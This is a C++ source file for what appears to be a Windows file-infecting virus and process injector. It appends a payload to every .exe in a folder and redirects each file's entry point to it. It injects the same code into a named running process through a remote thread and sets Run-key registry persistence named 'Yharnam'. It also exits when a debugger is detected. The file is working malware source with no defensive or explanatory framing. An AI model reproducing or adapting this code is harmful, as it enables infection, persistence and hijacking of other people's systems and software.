#include <iostream>
#include <iomanip>
#include <windows.h>
#include <winternl.h>
#include <string.h>
#include <io.h>
#include <tlhelp32.h> 

using namespace std;

extern "C" CHAR __begin_of_code;
extern "C" CHAR __end_of_code;
extern "C" LONGLONG delta; 

struct MapFile
{
    HANDLE hFile;
    PUCHAR lpAddr;
    DWORD dwNewSize;
    DWORD oldAoE;
    PUCHAR payload;
    size_t sz;

    MapFile(const char* file, PUCHAR payload, size_t sz) : payload(payload), sz(sz)
    {
        cout << "Constructor for " << file << endl;
        hFile = CreateFileA(
            file,
            GENERIC_WRITE | GENERIC_READ,
            0, NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        if (hFile == INVALID_HANDLE_VALUE) {
            cout << "Error opening " << file << ": " << GetLastError() << endl;
            return;
        }
        DWORD dwFileSize = GetFileSize(hFile, NULL);
        dwNewSize = dwFileSize + sz;
        HANDLE hMapFile = CreateFileMapping(
            hFile,
            NULL,
            PAGE_READWRITE,
            0,
            dwNewSize,
            NULL
        );
        if (hMapFile == NULL) {
            cout << "Error creating mapping for " << file << ": " << GetLastError() << endl;
            CloseHandle(hFile);
            return;
        }
        lpAddr = (PUCHAR)MapViewOfFile(
            hMapFile,
            FILE_MAP_ALL_ACCESS,
            0,
            0,
            0
        );
        if (lpAddr == NULL) {
            cout << "Error mapping view for " << file << ": " << GetLastError() << endl;
            CloseHandle(hMapFile);
            CloseHandle(hFile);
            return;
        }
    }

    void showPE()
    {
        if (lpAddr == NULL) return;
        auto dosHeader = (PIMAGE_DOS_HEADER)lpAddr;
        auto pNtHeader = (PIMAGE_NT_HEADERS64)(lpAddr + dosHeader->e_lfanew);
        auto numSection = pNtHeader->FileHeader.NumberOfSections;
        cout << "PE signature: " << (LPCSTR)pNtHeader << endl;
        cout << "Num section: " << numSection << endl;
        auto sectionHeader = (PIMAGE_SECTION_HEADER)((PUCHAR)pNtHeader + sizeof(IMAGE_NT_HEADERS64));
        for (int i = 0; i < numSection; i += 1) {
            cout << "Section id: " << i << endl;
            cout << "Section Name v2: " << sectionHeader[i].Name << endl;
            cout << "Section Adr" << sectionHeader[i].PointerToRawData << endl;
        }
    }

    void editLastSectionPE(PLONGLONG pDelta)
    {
        if (lpAddr == NULL) return;
        auto dosHeader = (PIMAGE_DOS_HEADER)lpAddr;
        auto pNtHeader = (PIMAGE_NT_HEADERS64)(lpAddr + dosHeader->e_lfanew);
        auto numSection = pNtHeader->FileHeader.NumberOfSections;
        cout << "PE signature: " << (LPCSTR)pNtHeader << endl;
        cout << "Num section: " << numSection << endl;
        auto sectionHeader = (PIMAGE_SECTION_HEADER)((PUCHAR)pNtHeader
            + sizeof(IMAGE_NT_HEADERS64));
        auto lastSection = (PIMAGE_SECTION_HEADER)((PUCHAR)sectionHeader
            + ((numSection - 1) * sizeof(IMAGE_SECTION_HEADER)));
        cout << "Last Section Name: " << sectionHeader[numSection - 1].Name << endl;
        oldAoE = pNtHeader->OptionalHeader.AddressOfEntryPoint;
        pNtHeader->OptionalHeader.AddressOfEntryPoint = lastSection->VirtualAddress + lastSection->SizeOfRawData;
        DWORD oldProtect;
        VirtualProtect(pDelta, 4096, PAGE_READWRITE, &oldProtect);
        *pDelta = (LONGLONG)oldAoE - (LONGLONG)pNtHeader->OptionalHeader.AddressOfEntryPoint;
        PUCHAR dstCpy = lpAddr + lastSection->PointerToRawData + lastSection->SizeOfRawData;
        memcpy(dstCpy, payload, sz);
        pNtHeader->OptionalHeader.SizeOfImage += sz;
        lastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
        lastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE;
        lastSection->SizeOfRawData += sz;
        lastSection->Misc.VirtualSize += sz;
    }

    void dumpPayload()
    {
        for (size_t i = 0; i < sz; i += 1)
        {
            cout << hex << setw(2) << setfill('0') << (int)payload[i];
            cout << " ";
            if (i % 20 == 0 && i != 0)
                cout << endl;
        }
        cout << endl;
    }

    ~MapFile()
    {
        cout << "Destruction" << endl;
        if (lpAddr != NULL) FlushViewOfFile(lpAddr, dwNewSize);
        if (lpAddr != NULL) UnmapViewOfFile(lpAddr);
        if (hFile != INVALID_HANDLE_VALUE) FlushFileBuffers(hFile);
        if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    }
};

void list_dll()
{
    PTEB pTeb = NtCurrentTeb();
    PPEB pPeb = pTeb->ProcessEnvironmentBlock;
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pList = &pLdr->InMemoryOrderModuleList;
    for (PLIST_ENTRY pNode = pList->Flink; pNode != pList; pNode = pNode->Flink)
    {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(
            pNode,
            LDR_DATA_TABLE_ENTRY,
            InMemoryOrderLinks
        );
        wcout << L"Entry dll: " << pEntry->FullDllName.Buffer << endl;
    }
}

static inline int wlen(const wchar_t* s)
{
    int i = 0;
    while (s[i])
        i += 1;
    return i;
}

static inline wchar_t wlow(const wchar_t c)
{
    if (c >= L'A' && c <= L'Z')
        return c - L'A' + L'a';
    return c;
}

static inline wchar_t endwith(const wchar_t* s1, const wchar_t* s2)
{
    size_t len1 = wlen(s1);
    size_t len2 = wlen(s2);
    int i = len1;
    int j = len2;
    while (i > 0 && j > 0)
    {
        wchar_t c1 = wlow(s1[i]);
        wchar_t c2 = wlow(s2[j]);
        if (c1 != c2)
            return c1;
        i -= 1;
        j -= 1;
    }
    return 0;
}

PUCHAR get_dll(const wchar_t* suffix)
{
    PTEB pTeb = NtCurrentTeb();
    PPEB pPeb = pTeb->ProcessEnvironmentBlock;
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pList = &pLdr->InMemoryOrderModuleList;
    for (PLIST_ENTRY pNode = pList->Flink; pNode != pList; pNode = pNode->Flink)
    {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(
            pNode,
            LDR_DATA_TABLE_ENTRY,
            InMemoryOrderLinks
        );
        wcout << L"Entry dll: " << pEntry->FullDllName.Buffer << endl;
        if (!endwith(pEntry->FullDllName.Buffer, suffix))
            return (PUCHAR)pEntry->DllBase;
    }
    return 0;
}

void list_func(PUCHAR base)
{
    auto dosHeader = (PIMAGE_DOS_HEADER)base;
    auto pNtHeader = (PIMAGE_NT_HEADERS64)(base + dosHeader->e_lfanew);
    auto pDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    auto pExport = (PIMAGE_EXPORT_DIRECTORY)(base + pDir->VirtualAddress);
    auto rvaNames = (PDWORD)(base + pExport->AddressOfNames);
    auto rvaPtrs = (PDWORD)(base + pExport->AddressOfFunctions);
    auto rvaOrd = (PWORD)(base + pExport->AddressOfNameOrdinals);
    for (int i = 0; i < pExport->NumberOfNames; i += 1)
    {
        const char* fname = (const char*)(base + rvaNames[i]);
        PUCHAR ptrfunc = (base + rvaPtrs[rvaOrd[i]]);
        cout << "Func: " << fname << " at " << hex << setw(16) << setfill('0') << (PVOID)ptrfunc << endl;
    }
}

PVOID get_func(PUCHAR base, const char* func_name)
{
    auto dosHeader = (PIMAGE_DOS_HEADER)base;
    auto pNtHeader = (PIMAGE_NT_HEADERS64)(base + dosHeader->e_lfanew);
    auto pDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    auto pExport = (PIMAGE_EXPORT_DIRECTORY)(base + pDir->VirtualAddress);
    auto rvaNames = (PDWORD)(base + pExport->AddressOfNames);
    auto rvaPtrs = (PDWORD)(base + pExport->AddressOfFunctions);
    auto rvaOrd = (PWORD)(base + pExport->AddressOfNameOrdinals);
    for (int i = 0; i < pExport->NumberOfNames; i += 1)
    {
        const char* fname = (const char*)(base + rvaNames[i]);
        PUCHAR ptrfunc = (base + rvaPtrs[rvaOrd[i]]);
        if (!strcmp(fname, func_name))
            return ptrfunc;
    }
    return nullptr;
}

bool is_debugged()
{
    return IsDebuggerPresent();
}

void infect_directory(const char* dir)
{
    if (dir != NULL && *dir != '\0') {
        if (SetCurrentDirectoryA(dir) == 0) {
            cout << "Error changing to " << dir << ": " << GetLastError() << endl;
            return;
        }
    }
    struct _finddata_t fileinfo;
    intptr_t handle = _findfirst("*.exe", &fileinfo);
    if (handle == -1) {
        cout << "No .exe files found" << endl;
        return;
    }
    do {
        
        if (strstr(fileinfo.name, "code.exe") != NULL) continue;
        cout << "Infecting: " << fileinfo.name << endl;
        size_t sz = (PUCHAR)&__end_of_code - (PUCHAR)&__begin_of_code;
        MapFile* f = new MapFile(fileinfo.name, (PUCHAR)&__begin_of_code, sz);
        f->editLastSectionPE(&delta);
        f->dumpPayload();
        delete f;
    } while (_findnext(handle, &fileinfo) == 0);
    _findclose(handle);
}

void infect_process(const char* proc_name)
{
    if (!proc_name) return; 

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        cout << "Error creating process snapshot: " << GetLastError() << endl;
        return;
    }

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snap, &entry)) {
        do {
            if (_stricmp(entry.szExeFile, proc_name) == 0) {
                cout << "Infecting process: " << proc_name << " PID: " << entry.th32ProcessID << endl;

                HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
                if (hProc) {
                    size_t sz = (PUCHAR)&__end_of_code - (PUCHAR)&__begin_of_code;

                    PUCHAR remote = (PUCHAR)VirtualAllocEx(hProc, NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if (remote) {
                        if (WriteProcessMemory(hProc, remote, &__begin_of_code, sz, NULL)) {
                            cout << "Payload copied to remote process" << endl;

                            PUCHAR remote_rbp = remote;
                            
                            HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                (LPTHREAD_START_ROUTINE)remote,
                                remote_rbp,  
                                0, NULL);

                            if (hThread) {
                                cout << "Remote thread created successfully" << endl;
                                WaitForSingleObject(hThread, 5000); 
                                CloseHandle(hThread);
                            }
                            else {
                                cout << "Error creating remote thread: " << GetLastError() << endl;
                            }
                        }
                        else {
                            cout << "Error writing to remote memory " << GetLastError() << endl;
                        }

                        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
                    }
                    else {
                        cout << "Error allocating remote memory: " << GetLastError() << endl;
                    }
                    CloseHandle(hProc);
                }
                else {
                    cout << "Error opening process: " << GetLastError() << endl;
                }
            }
        } while (Process32Next(snap, &entry));
    }
    CloseHandle(snap);
}

void add_persistence()
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        RegSetValueExA(hKey, "Yharnam", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
        cout << "Persistence added" << endl;
    }
    else {
        cout << "Error adding persistence: " << GetLastError() << endl;
    }
}

int main(int ac, char** av)
{
    if (is_debugged()) {
        fprintf(stderr, "Debugger detected\n");
        ExitProcess(1);
    }
    cout << "Injector" << endl;
    const char* dir = (ac > 1) ? av[1] : NULL;
    infect_directory(dir);
    infect_process(av[2]);
    add_persistence();
    return 0;
}